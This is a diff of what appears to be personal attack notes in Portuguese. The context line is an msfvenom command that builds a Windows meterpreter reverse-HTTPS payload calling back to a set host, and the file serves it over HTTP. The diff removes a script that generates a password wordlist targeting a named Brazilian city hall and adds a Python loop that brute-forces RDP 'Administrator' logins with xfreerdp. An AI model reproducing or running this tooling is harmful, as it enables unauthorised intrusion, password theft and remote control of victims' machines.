@@ -6,30 +6,33 @@ msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.1.128 LPORT=443 -f p
 
 python3 -m http.server 8080
 
-empresa_base = ["prefeitura", "atibaia", "prefeituraatibaia", "sum", "suma", "suma57667"]
-anos = ["2019", "2020", "2021"]
-sufixos = ["", "123", "1234", "@123", "!@#", "#", "@!", "@#"]
-combinacoes_fixas = [
-    "admin", "administrator", "senha", "senha123", "qwerty", "123456", "windows", "usuario"
-]
+import subprocess
 
-with open("wordlist_atibaia.txt", "w") as f:
-    for base in empresa_base:
-        for ano in anos:
-            f.write(f"{base}{ano}\n")
-            f.write(f"{base}@{ano}\n")
-            for suf in sufixos:
-                f.write(f"{base}{ano}{suf}\n")
-                f.write(f"{base}@{ano}{suf}\n")
-        for suf in sufixos:
-            f.write(f"{base}{suf}\n")
+ip_alvo = "SEU_IP_AQUI"
+usuario = "Administrator"
+wordlist_path = "/caminho/para/wordlist_atibaia.txt"
 
-    for fixo in combinacoes_fixas:
-        f.write(f"{fixo}\n")
-        for ano in anos:
-            f.write(f"{fixo}{ano}\n")
-            for suf in sufixos:
-                f.write(f"{fixo}{ano}{suf}\n")
-                f.write(f"{fixo}@{ano}{suf}\n")
+with open(wordlist_path, "r") as file:
+    senhas = file.read().splitlines()
 
-print("Wordlist personalizada criada como 'wordlist_atibaia.txt'")
+for senha in senhas:
+    print(f"Tentando senha: {senha}")
+    comando = [
+        "xfreerdp",
+        f"/u:{usuario}",
+        f"/p:{senha}",
+        f"/v:{ip_alvo}",
+        "/cert:ignore",
+        "+auth-only"  # importante: apenas tenta autenticar sem abrir sessão gráfica
+    ]
+
+    resultado = subprocess.run(comando, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
+
+    if "Authentication only, exit status 0" in resultado.stdout:
+        print(f"\n✅ Senha encontrada: {senha}")
+        break
+    else:
+        print("Falha.\n")
+
+print("Fim do processo.")
+
